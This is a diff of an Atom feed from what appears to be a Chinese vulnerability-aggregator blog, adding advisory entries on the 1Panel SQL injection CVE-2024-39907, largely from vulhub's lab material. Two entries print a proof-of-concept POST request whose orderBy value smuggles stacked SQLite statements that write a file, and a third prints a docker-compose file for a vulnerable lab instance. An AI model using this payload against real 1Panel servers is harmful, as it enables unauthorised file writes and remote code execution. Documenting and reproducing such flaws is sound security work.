@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-18T16:00:09.520Z</updated>
+  <updated>2025-06-18T17:15:39.464Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,87 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>1Panel SQL注入漏洞</title>
+    <link href="http://example.com/2025/06/18/github_3931997807/"/>
+    <id>http://example.com/2025/06/18/github_3931997807/</id>
+    <published>2025-06-18T17:15:39.471Z</published>
+    <updated>2025-06-18T17:15:39.464Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> 1Panel SQL注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-39907</li></ul><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> CVE-2024-39907是1Panel服务器管理控制面板中的一个严重安全漏洞，涉及多个SQL注入点，可能导致远程代码执行（RCE）。该漏洞存在于1Panel的多个接口中，由于过滤不足，攻击者可以实现任意文件写入，最终导致远程代码执行。1Panel是一个基于Web的Linux服务器管理控制面板，提供图形界面进行服务器管理。此漏洞影响1Panel v1.10.9-lts及更早版本，已在v1.10.12-tls2中修复。</p><p><strong>产品厂商：</strong> 1Panel</p><p><strong>产品名称：</strong> 1Panel Control Panel</p><p><strong>影响版本：</strong> version &lt;&#x3D; 1.10.9-lts</p><p><strong>来源：</strong> <a href="https://github.com/vulhub/vulhub/blob/295340d393805c2b6d22549868d5a54764488ec0/1panel%2FCVE-2024-39907%2FREADME.md">https://github.com/vulhub/vulhub/blob/295340d393805c2b6d22549868d5a54764488ec0/1panel%2FCVE-2024-39907%2FREADME.md</a></p><p><strong>类型：</strong> vulhub&#x2F;vulhub:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2024-39907-In-Depth-Analysis-of-SQL-Injection-Vulnerability-in-1Panel-Control-Panel"><a href="#CVE-2024-39907-In-Depth-Analysis-of-SQL-Injection-Vulnerability-in-1Panel-Control-Panel" class="headerlink" title="CVE-2024-39907: In-Depth Analysis of SQL Injection Vulnerability in 1Panel Control Panel"></a>CVE-2024-39907: In-Depth Analysis of SQL Injection Vulnerability in 1Panel Control Panel</h2><p>CVE-2024-39907 is a critical security vulnerability affecting the 1Panel server management control panel, involving multiple SQL injection points that could lead to remote code execution (RCE). Below is a detailed technical analysis of this vulnerability.</p><h3 id="Vulnerability-Overview"><a href="#Vulnerability-Overview" class="headerlink" title="Vulnerability Overview"></a>Vulnerability Overview</h3><p>CVE-2024-39907 is a collection of multiple SQL injection vulnerabilities present in the 1Panel control panel. These vulnerabilities exist across several interfaces of 1Panel, where insufficient filtering could allow attackers to achieve arbitrary file writes and ultimately remote code execution (RCE)12.</p><p>1Panel is a web-based Linux server management control panel that provides a graphical interface for server administration. This vulnerability affects 1Panel v1.10.9-lts and earlier versions, and has been patched in v1.10.12-tls2.</p><p>Reference links:</p><ul><li><a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2024/CVE-2024-39907.yaml">nuclei-templates&#x2F;http&#x2F;cves&#x2F;2024&#x2F;CVE-2024-39907.yaml at main · projectdiscovery&#x2F;nuclei-templates</a></li><li><a href="https://hub.docker.com/r/moelin/1panel">https://hub.docker.com/r/moelin/1panel</a></li></ul><h3 id="Vulnerability-Environment"><a href="#Vulnerability-Environment" class="headerlink" title="Vulnerability Environment"></a>Vulnerability Environment</h3><p>Execute the following command to start a vulnerable instance of 1Panel v1.10.10-lts:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker compose up -d</span><br></code></pre></td></tr></table></figure><ul><li>Default port: <code>10086</code></li><li>Default username: <code>1panel</code></li><li>Default password: <code>1panel_password</code></li><li>Default entrance: <code>entrance</code></li></ul><p>Then access <code>http://your-ip:10086/entrance</code> to see the login page and log in using the default credentials.</p><h3 id="Vulnerability-Reproduction"><a href="#Vulnerability-Reproduction" class="headerlink" title="Vulnerability Reproduction"></a>Vulnerability Reproduction</h3><p>The vulnerability primarily exists in the API interfaces of 1Panel, particularly the <code>/api/v1/hosts/command/search</code> endpoint. Attackers can trigger SQL injection by carefully crafting request parameters2.</p><p>A typical proof-of-concept (PoC) request is as follows:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/v1/hosts/command/search</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.8.128:8877<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/plain, */*<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.8.128:8877/aaa<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>psession=you-session<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>83<br><br><span class="language-scilab">&#123;</span><br><span class="language-scilab">  <span class="hljs-string">&quot;page&quot;</span>:<span class="hljs-number">1</span>,</span><br><span class="language-scilab">  <span class="hljs-string">&quot;pageSize&quot;</span>:<span class="hljs-number">10</span>,</span><br><span class="language-scilab">  <span class="hljs-string">&quot;groupID&quot;</span>:<span class="hljs-number">0</span>,</span><br><span class="language-scilab">  <span class="hljs-string">&quot;orderBy&quot;</span>:<span class="hljs-string">&quot;3;ATTACH DATABASE &#x27;</span>/tmp/randstr.txt&#x27; AS test;create TABLE test.<span class="hljs-built_in">exp</span> (data text);create TABLE test.<span class="hljs-built_in">exp</span> (data text);drop table test.<span class="hljs-built_in">exp</span>;<span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-scilab">  &quot;</span>order<span class="hljs-string">&quot;:&quot;</span>ascending<span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-scilab">  &quot;</span>name<span class="hljs-string">&quot;:&quot;</span>a<span class="hljs-string">&quot;</span></span><br><span class="hljs-string"><span class="language-scilab">&#125;</span></span><br></code></pre></td></tr></table></figure><p>This attempts to create a database file to confirm whether the injection is successful.</p><p><img src="https://github.com/vulhub/vulhub/1panel/CVE-2024-39907/1.png" alt="image-20250618234105405"></p><h3 id="Limitations-and-Considerations"><a href="#Limitations-and-Considerations" class="headerlink" title="Limitations and Considerations"></a>Limitations and Considerations</h3><ol><li><strong>Valid session required</strong>: As shown by the <code>psession=you-session</code> cookie, the attacker must first obtain valid authentication credentials.</li><li><strong>SQLite-specific syntax</strong>: This PoC uses SQLite-specific commands, indicating that the 1Panel backend uses SQLite database.</li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; 1Panel SQL注入漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/st</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+    <category term="vulhub/vulhub:github issues" scheme="http://example.com/tags/vulhub-vulhub-github-issues/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>1Panel SQL注入漏洞</title>
+    <link href="http://example.com/2025/06/18/github_1137585108/"/>
+    <id>http://example.com/2025/06/18/github_1137585108/</id>
+    <published>2025-06-18T17:15:25.352Z</published>
+    <updated>2025-06-18T17:15:25.352Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> 1Panel SQL注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-39907</li></ul><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 1Panel存在SQL注入漏洞，攻击者可以利用此漏洞执行恶意SQL命令，可能导致数据泄露或其他恶意操作。</p><p><strong>产品名称：</strong> 1Panel</p><p><strong>来源：</strong> <a href="https://github.com/vulhub/vulhub/blob/295340d393805c2b6d22549868d5a54764488ec0/1panel%2FCVE-2024-39907%2Fdocker-compose.yml">https://github.com/vulhub/vulhub/blob/295340d393805c2b6d22549868d5a54764488ec0/1panel%2FCVE-2024-39907%2Fdocker-compose.yml</a></p><p><strong>类型：</strong> vulhub&#x2F;vulhub:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><br><span class="hljs-symbol">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-symbol">services:</span><br>  1<span class="hljs-symbol">panel:</span><br>    <span class="hljs-symbol">container_name:</span> 1panel <span class="hljs-comment"># 容器名</span><br>    <span class="hljs-symbol">restart:</span> always<br>    <span class="hljs-symbol">network_mode:</span> <span class="hljs-string">&quot;host&quot;</span><br>    <span class="hljs-symbol">volumes:</span><br>      - <span class="hljs-regexp">/var/run</span><span class="hljs-regexp">/docker.sock:/var</span><span class="hljs-regexp">/run/docker</span>.sock<br>      - <span class="hljs-regexp">/var/lib</span><span class="hljs-regexp">/docker/volumes</span><span class="hljs-symbol">:/var/lib/docker/volumes</span><br>      - <span class="hljs-regexp">/opt:/opt</span>  <span class="hljs-comment"># 文件存储映射</span><br>      - <span class="hljs-regexp">/root:/root</span>  <span class="hljs-comment"># 可选的文件存储映射</span><br>      - <span class="hljs-regexp">/etc/docker</span><span class="hljs-symbol">:/etc/docker</span>  <span class="hljs-comment"># docker 配置文件夹映射</span><br>    <span class="hljs-symbol">environment:</span><br>      - <span class="hljs-variable constant_">TZ</span>=<span class="hljs-title class_">Asia</span>/<span class="hljs-title class_">Shanghai</span>  <span class="hljs-comment"># 时区设置</span><br>    <span class="hljs-symbol">image:</span> moelin/1<span class="hljs-symbol">panel:</span>v1.<span class="hljs-number">10.10</span>-lts<br>    <span class="hljs-symbol">labels:</span><br>      <span class="hljs-symbol">createdBy:</span> <span class="hljs-string">&quot;Apps&quot;</span><br><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; 1Panel SQL注入漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/st</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+    <category term="vulhub/vulhub:github issues" scheme="http://example.com/tags/vulhub-vulhub-github-issues/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>1Panel控制面板SQL注入漏洞</title>
+    <link href="http://example.com/2025/06/18/github_4266038883/"/>
+    <id>http://example.com/2025/06/18/github_4266038883/</id>
+    <published>2025-06-18T17:15:16.805Z</published>
+    <updated>2025-06-18T17:15:16.804Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> 1Panel控制面板SQL注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-39907</li></ul><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> CVE-2024-39907是1Panel控制面板中存在的多个SQL注入漏洞集合，这些漏洞存在于1Panel的多个接口中，部分注入点由于过滤不善，可能导致攻击者实现任意文件写入，最终达成远程命令执行(RCE)。1Panel是一款基于Web的Linux服务器管理控制面板，提供服务器管理的图形化界面。该漏洞影响1Panel v1.10.9-lts及更早版本，已在v1.10.12-tls版本中得到修复。</p><p><strong>产品厂商：</strong> 1Panel</p><p><strong>产品名称：</strong> 1Panel控制面板</p><p><strong>影响版本：</strong> version &lt;&#x3D; 1.10.9-lts</p><p><strong>来源：</strong> <a href="https://github.com/vulhub/vulhub/blob/295340d393805c2b6d22549868d5a54764488ec0/1panel%2FCVE-2024-39907%2FREADME.zh-cn.md">https://github.com/vulhub/vulhub/blob/295340d393805c2b6d22549868d5a54764488ec0/1panel%2FCVE-2024-39907%2FREADME.zh-cn.md</a></p><p><strong>类型：</strong> vulhub&#x2F;vulhub:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2024-39907：1Panel控制面板SQL注入漏洞深度分析"><a href="#CVE-2024-39907：1Panel控制面板SQL注入漏洞深度分析" class="headerlink" title="CVE-2024-39907：1Panel控制面板SQL注入漏洞深度分析"></a>CVE-2024-39907：1Panel控制面板SQL注入漏洞深度分析</h2><p>CVE-2024-39907是一个影响1Panel服务器管理控制面板的严重安全漏洞，涉及多个SQL注入点，可能导致远程命令执行(RCE)。以下是对该漏洞的详细技术分析。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>CVE-2024-39907是1Panel控制面板中存在的多个SQL注入漏洞集合，这些漏洞存在于1Panel的多个接口中，部分注入点由于过滤不善，可能导致攻击者实现任意文件写入，最终达成远程命令执行(RCE)12。</p><p>1Panel是一款基于Web的Linux服务器管理控制面板，提供服务器管理的图形化界面。该漏洞影响1Panel v1.10.9-lts及更早版本，已在v1.10.12-tls版本中得到修复2。</p><p>参考链接：</p><ul><li><a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2024/CVE-2024-39907.yaml">nuclei-templates&#x2F;http&#x2F;cves&#x2F;2024&#x2F;CVE-2024-39907.yaml at main · projectdiscovery&#x2F;nuclei-templates</a></li><li><a href="https://hub.docker.com/r/moelin/1panel">https://hub.docker.com/r/moelin/1panel</a></li></ul><h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><p>执行如下命令启动一个有漏洞的1Panel v1.10.10-lts：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker compose up -d</span><br></code></pre></td></tr></table></figure><ul><li>默认端口：<code>10086</code></li><li>默认账户：<code>1panel</code></li><li>默认密码：<code>1panel_password</code></li><li>默认输入：<code>entrance</code></li></ul><p>然后访问<code>http://your-ip:10086/entrance</code>即可看到登录页面，使用默认账户密码登录。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>漏洞主要存在于1Panel的API接口中，特别是<code>/api/v1/hosts/command/search</code>接口。攻击者可以通过精心构造的请求参数触发SQL注入2。</p><p>一个典型的POC请求如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/v1/hosts/command/search</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.8.128:8877<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/plain, */*<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.8.128:8877/aaa<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>psession=you-session<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>83<br><br><span class="language-scilab">&#123;</span><br><span class="language-scilab">  <span class="hljs-string">&quot;page&quot;</span>:<span class="hljs-number">1</span>,</span><br><span class="language-scilab">  <span class="hljs-string">&quot;pageSize&quot;</span>:<span class="hljs-number">10</span>,</span><br><span class="language-scilab">  <span class="hljs-string">&quot;groupID&quot;</span>:<span class="hljs-number">0</span>,</span><br><span class="language-scilab">  <span class="hljs-string">&quot;orderBy&quot;</span>:<span class="hljs-string">&quot;3;ATTACH DATABASE &#x27;</span>/tmp/randstr.txt&#x27; AS test;create TABLE test.<span class="hljs-built_in">exp</span> (data text);create TABLE test.<span class="hljs-built_in">exp</span> (data text);drop table test.<span class="hljs-built_in">exp</span>;<span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-scilab">  &quot;</span>order<span class="hljs-string">&quot;:&quot;</span>ascending<span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-scilab">  &quot;</span>name<span class="hljs-string">&quot;:&quot;</span>a<span class="hljs-string">&quot;</span></span><br><span class="hljs-string"><span class="language-scilab">&#125;</span></span><br></code></pre></td></tr></table></figure><p>通过尝试创建数据库文件来确认注入是否成功。</p><p><img src="https://github.com/vulhub/vulhub/1panel/CVE-2024-39907/1.png" alt="image-20250618234105405"></p><h3 id="限制与注意事项"><a href="#限制与注意事项" class="headerlink" title="限制与注意事项"></a>限制与注意事项</h3><ol><li><strong>需要有效会话</strong>：如Cookie中的<code>psession=you-session</code>所示，攻击者需要先获取有效认证凭证</li><li><strong>SQLite特定语法</strong>：这个POC使用了SQLite特有的命令，表明1Panel后端使用SQLite数据库</li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; 1Panel控制面板SQL注入漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+    <category term="vulhub/vulhub:github issues" scheme="http://example.com/tags/vulhub-vulhub-github-issues/"/>
+    
+  </entry>
   
   <entry>
     <title>An issue in EfroTech Time Trax v10 allows a remote attacker to execute arbitrary code via the</title>
@@ -459,87 +540,6 @@
     <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
     <category term="安恒信息CERT" scheme="http://example.com/tags/%E5%AE%89%E6%81%92%E4%BF%A1%E6%81%AFCERT/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【已复现】泛微E-cology9存在远程代码执行漏洞</title>
-    <link href="http://example.com/2025/06/18/weixin_2337216853/"/>
-    <id>http://example.com/2025/06/18/weixin_2337216853/</id>
-    <published>2025-06-18T09:51:24.382Z</published>
-    <updated>2025-06-18T09:51:24.377Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 安恒信息CERT</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/i3aNLllLMP-KDIv1CoQaNg">https://mp.weixin.qq.com/s/i3aNLllLMP-KDIv1CoQaNg</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 安恒信息CERT&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/i3aNLllLMP-KDIv1CoQaNg&quot;&gt;https://mp.weixin.</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="安恒信息CERT" scheme="http://example.com/tags/%E5%AE%89%E6%81%92%E4%BF%A1%E6%81%AFCERT/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>伊朗在日益升级的地区冲突中减缓互联网速度以防止网络攻击</title>
-    <link href="http://example.com/2025/06/18/weixin_1512984358/"/>
-    <id>http://example.com/2025/06/18/weixin_1512984358/</id>
-    <published>2025-06-18T09:45:09.582Z</published>
-    <updated>2025-06-18T09:45:09.580Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/Tn3uxgVCfreai-xlsb6a5w">https://mp.weixin.qq.com/s/Tn3uxgVCfreai-xlsb6a5w</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/Tn3uxgVCfreai-xlsb6a5w&quot;&gt;https://mp.weixin.qq.c</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Chrome 漏洞让攻击者执行任意代码 - 立即更新！</title>
-    <link href="http://example.com/2025/06/18/weixin_2430850262/"/>
-    <id>http://example.com/2025/06/18/weixin_2430850262/</id>
-    <published>2025-06-18T09:45:08.066Z</published>
-    <updated>2025-06-18T09:45:08.064Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/zEOoVYy0D8Re7VtQh_FzFA">https://mp.weixin.qq.com/s/zEOoVYy0D8Re7VtQh_FzFA</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/zEOoVYy0D8Re7VtQh_FzFA&quot;&gt;https://mp.weixin.qq.c</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
     
   </entry>
   
